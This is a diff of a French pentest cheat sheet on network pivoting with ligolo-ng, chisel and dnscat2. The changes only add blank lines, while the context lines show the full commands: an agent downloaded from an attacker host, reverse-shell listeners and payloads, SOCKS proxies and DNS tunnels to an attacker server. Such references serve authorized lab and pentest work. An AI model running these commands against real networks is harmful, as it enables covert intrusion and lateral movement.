@@ -26,6 +26,7 @@ Configurer et comprendre les chemins de communication réseau.
 sudo ip tuntap add user [kali_user] mode tun ligolo
 
 sudo ip link set ligolo up
+
 ```
 
 
@@ -36,6 +37,7 @@ sudo ip link set ligolo up
 ./ligolo_proxy_linux -selfcert
 # Autre possibilité
 ./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>
+
 ```
 
 
@@ -43,6 +45,7 @@ sudo ip link set ligolo up
 
 ```powershell
 iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe
+
 ```
 
 
@@ -53,6 +56,7 @@ iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile
 ./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
 # Autre possibilité
 ./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert
+
 ```
 
 
@@ -64,6 +68,7 @@ sudo ip route add [internal_submask]/24 dev ligolo
 
 # Vérifier la table de routage
 ip route list
+
 ```
 
 
@@ -75,6 +80,7 @@ ip route list
 » start
 
 # Après cela, le tunnel devrait être prêt, vous pourriez exécuter n'importe quelle commande.
+
 ```
 
 
@@ -91,6 +97,7 @@ Configurer et comprendre les chemins de communication réseau.
 sudo ip tuntap add user [kali_user] mode tun ligolo_double
 
 sudo ip link set ligolo_double up
+
 ```
 
 
@@ -102,6 +109,7 @@ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 
 # Vérifiez qu'il a été ajouté
 listener_list
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_01.png)
@@ -112,6 +120,7 @@ listener_list
 ```powershell
 # Ensuite, nous devons exécuter l'agent sur l'hôte Windows pour se connecter au port transmis sur notre machine d'attaque
 ./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_02.png)
@@ -124,6 +133,7 @@ listener_list
 ```bash
 # Notre dernière étape est de changer notre session en deuxième point de pivot (Windows), de démarrer le tunnel, puis d'ajouter une route au réseau nouvellement découvert à 10.1.30.0/24.
 sudo ip add route <New_Network> dev ligolo_double
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_04.png)
@@ -143,6 +153,7 @@ Vérifier les ports et les services de la cible autorisée.
 ```bash
 # Ajoutez une IP spéciale codée en dur pour le transfert de port local.
 sudo ip route add 240.0.0.1/32 dev ligolo
+
 ```
 
 
@@ -154,6 +165,7 @@ sudo ip route add 240.0.0.1/32 dev ligolo
 
 ```text
 dev ligolo
+
 ```
 
 
@@ -173,6 +185,7 @@ PORT STATE SERVICE VERSION
 631/tcp open ipp CUPS 2.2  
 3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1  
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png)
@@ -185,6 +198,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```bash
 nc -nvlp [kali_port]
+
 ```
 
 
@@ -192,6 +206,7 @@ nc -nvlp [kali_port]
 
 ```bash
 listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_10.png)
@@ -207,6 +222,7 @@ listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
 [command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
 # Autre possibilité
 ./payload.exe
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_11.png)
@@ -221,6 +237,7 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 
 ```bash
 listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_07.png)
@@ -230,6 +247,7 @@ listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
 
 ```bash
 python3 -m http.server [kali_port]
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_08.png)
@@ -239,6 +257,7 @@ python3 -m http.server [kali_port]
 
 ```powershell
 Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]
+
 ```
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_09.png)
@@ -262,6 +281,7 @@ chisel server -p <listen-port>
 
 # In local machine
 chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
+
 ```
 
 
@@ -280,6 +300,7 @@ chisel server -p <LOCAL_PORT> --reverse
 chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>
 
 # Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, <LOCAL_FORWARD_PORT> avec le port de votre machine locale auquel le service distant sera transmis, <REMOTE_IP> avec l'adresse IP de la machine distante, et <REMOTE_PORT> avec le port de la machine distante.
+
 ```
 
 
@@ -289,6 +310,7 @@ chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE
 curl http://localhost:<LOCAL_FORWARD_PORT>
 
 # Le résultat est le contenu de http://<REMOTE_IP>:<REMOTE_PORT>/
+
 ```
 
 
@@ -307,6 +329,7 @@ chisel server -p <REMOTE_PORT> --socks5
 chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks
 
 # Remplacer <REMOTE_PORT> par le port du proxy SOCKS sur la machine distante, <REMOTE_IP> par l'adresse IP de la machine distante, et <LOCAL_PORT> par le port de votre machine locale où le proxy SOCKS sera disponible.
+
 ```
 
 
@@ -322,6 +345,7 @@ chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks
 # /etc/proxychains.conf
 ...
 socks5 127.0.0.1 <LOCAL_PORT>
+
 ```
 
 
@@ -340,6 +364,7 @@ chisel server -p <LOCAL_PORT> --reverse
 chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks
 
 # Remplacer <LOCAL_PORT> par le port que vous voulez que Chisel écoute localement, <LOCAL_IP> avec l'adresse IP de votre machine locale, et <REMOTE_PORT> avec le port sur la machine distante où le proxy SOCKS sera disponible.
+
 ```
 
 
@@ -353,6 +378,7 @@ chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks
 # /etc/proxychains.conf
 ...
 socks5 127.0.0.1 <REMOTE_PORT>
+
 ```
 
 
@@ -360,6 +386,7 @@ socks5 127.0.0.1 <REMOTE_PORT>
 
 ```bash
 proxychains nmap localhost
+
 ```
 
 
@@ -377,6 +404,7 @@ Interroger les enregistrements DNS et identifier les services associés.
 ```bash
 # Remplacer [domain] par le domaine choisi
 dnscat2-server [domain]
+
 ```
 
 
@@ -392,6 +420,7 @@ dnscat2-server [domain]
 
 # Directly to server
 ./dnscat --dns server=[attacker_ip],port=53 --secret=[secret]
+
 ```
 
 
@@ -404,6 +433,7 @@ dnscat2-server [domain]
 ```bash
 dnscat2> windows
 dnscat2> window -i [session_id]
+
 ```
 
 
@@ -415,6 +445,7 @@ dnscat2> window -i [session_id]
 
 ```bash
 command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port]
+
 ```
 
 
@@ -427,6 +458,7 @@ command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_por
 ```bash
 # Exemple de commande
 smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]
+
 ```
 
 ---
